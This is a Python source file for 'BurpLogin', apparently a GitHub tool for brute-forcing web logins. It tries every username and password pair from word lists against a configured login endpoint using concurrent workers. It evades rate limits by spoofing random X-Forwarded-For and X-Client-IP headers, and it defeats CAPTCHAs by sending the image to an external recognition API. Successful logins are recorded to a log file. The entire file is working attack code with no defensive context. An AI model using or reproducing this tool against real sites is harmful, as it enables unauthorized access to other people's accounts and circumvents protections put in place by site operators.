#!/usr/bin/env python3
# -*- coding:utf8 -*-
from queue import Empty
from gevent import pool, queue, monkey;monkey.patch_all()
import requests
import json
import base64
import sys
import random
import warnings
import logging
import time
import threading

warnings.filterwarnings('ignore')
logging.basicConfig(filename='logger.log', filemode='a', level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
VERIFY_FAIL_TOTAL = 0
LOGIN_FAIL_TOTAL = 0
LOGIN_SUCCESS_TOTAL = 0
OUT_SIGN = 0
SIGN = True


class BurpLogin:
    def __init__(self):
        if not hasattr(BurpLogin, '__config'):
            self.__config = BurpLogin.__config = config
        self.request = requests.Session()
        self.request.verify = False
        self.request.headers.update({
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/87.0.4280.141 Safari/537.36",
            "x-client-ip": "220.1.{}.{}".format(random.randint(1, 255), random.randint(1, 255)),
            "x-forwarded-for": "220.1.{}.{}".format(random.randint(1, 255), random.randint(1, 255))
        })
        self.data = {}
        self.username_field_name = self.__config.get("login_config").get("data").get("username_field_name")
        self.password_field_name = self.__config.get("login_config").get("data").get("password_field_name")
        self.verify_field_name = self.__config.get("login_config").get("data").get("verify_field_name")
        self.load_verify_code_url = self.__config.get("verify_config").get("load_verify_code_url")
        self.verify_api = self.__config.get("verify_config").get("verify_api")
        self.data.update(self.__config.get("login_config").get("data"))
        self.verify_enable = self.__config.get("verify_config").get("enable")

        for key in self.__config.get("login_config").get("data").keys():
            if key not in ['username_field_name', 'password_field_name', 'verify_field_name']:
                self.data.update({
                    key: self.__config.get("login_config").get("data").get(key)
                })
            else:
                self.data.update({
                    self.__config.get("login_config").get("data").get(key): ''
                })
                self.data.pop(key)
        global OUT_SIGN
        if OUT_SIGN == 0:
            OUT_SIGN += 1
            print("[+] ----------------Notice-------------------------")
            print("[+] Verify status:{}".format(self.verify_enable))
            print("[+] Verify api:{}".format(self.verify_api))
            print("[+] Payload format:{}".format(self.data))

    def run(self, handle_task_pool):
        """
        执行登录
        :return:
        """
        global VERIFY_FAIL_TOTAL, LOGIN_FAIL_TOTAL, LOGIN_SUCCESS_TOTAL, SIGN, r
        while True:
            try:
                task = handle_task_pool.get(timeout=2)
                r, req = self.__login(_username=task[0], _password=task[1])
            except (KeyboardInterrupt, Empty) as e:
                SIGN = False
                print("[+] Welcome star https://github.com/mycve/BurpLogin    >_< Love you..")
                exit(0)

            if r == 1:
                LOGIN_SUCCESS_TOTAL += 1
                logging.info('### login success {}'.format(json.dumps(self.data)))
            elif r == -1:
                VERIFY_FAIL_TOTAL += 1
                handle_task_pool.put(task)
                logging.warning('### verify error ,try again... {}'.format(json.dumps(self.data)))
            elif r == 0:
                LOGIN_FAIL_TOTAL += 1
                logging.warning('### login fail {}'.format(json.dumps(self.data)))

    def __login(self, _username, _password) -> (int, requests.Response):
        """
        Login model
        :param _username:
        :param _password:
        :return:  0 登录失败 -1 验证码错误 1 登录可能成功
        """
        url = self.__config.get("login_config").get("url")
        method = self.__config.get("login_config").get("method")
        is_payload = self.__config.get("login_config").get("isPayload")
        if self.__config.get("verify_config").get("enable"):
            self.__verify()  # 验证码开启，执行一下验证码
        self.data.update({
            self.username_field_name: _username,
            self.password_field_name: _password,
        })
        req = None
        if method.upper() == "POST":
            if is_payload:
                req = self.request.post(url=url, json=self.data)
            else:
                req = self.request.post(url=url, data=self.data)
        elif method.upper() == "GET":
            req = self.request.get(url=url, params=self.data)

        login_fail = self.__config.get("login_config").get("login_fail")
        for e in login_fail.get("page_contain_str"):
            if req.text.find(e) != -1:
                return 0, req  # 登录失败
        if req.status_code in login_fail.get("status"):
            return 0, req

        if self.__config.get("verify_config").get("enable"):
            for e in self.__config.get("verify_config").get("verify_error_contain_str"):
                if req.text.find(e) != -1:
                    return -1, req  # 验证码错误
        self.request.cookies.clear()
        logging.debug(msg='### {}'.format(json.dumps(self.data)))
        return 1, req

    def __verify(self):
        """
        执行验证请求图像，并识别
        :return:
        """
        image_req = self.request.get(self.load_verify_code_url)
        assert image_req.headers.get('Content-Type').find('image') != -1, 'This is not image,check it or waf ??'
        image_content = image_req.content
        image_base64 = base64.b64encode(image_content).decode("utf-8")
        payload = self.__config.get("verify_config").get("post")
        payload.update({
            "data": image_base64
        })
        r = self.request.post(self.verify_api, json=payload)
        r = r.json().get("msg")
        self.data.update({
            self.verify_field_name: r
        })


def status():
    while SIGN:
        print('[+] verify_fail:{}----login_fail:{}----login_success:{}'.format(VERIFY_FAIL_TOTAL, LOGIN_FAIL_TOTAL, LOGIN_SUCCESS_TOTAL), end='\r')
        time.sleep(1)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print("请传入配置文路径")
        exit(0)
    file_path = sys.argv[1]
    # file_path = 'Verify.json'
    config = json.load(open(file_path, 'r', encoding='utf-8'))
    POOL = pool.Pool(config.get("speed"))
    QUEUE = queue.Queue(2000)
    threading.Thread(target=status).start()
    for e in range(config.get("speed")):
        POOL.apply_async(BurpLogin().run, args=(QUEUE,))
    f_username = open('username.txt', 'r')
    f_password = open('password.txt', 'r')
    for u in f_username:
        for p in f_password:
            QUEUE.put([u.strip(), p.strip()])
        f_password.seek(0)
    f_username.close()
    f_password.close()
    SIGN = False
    POOL.join()
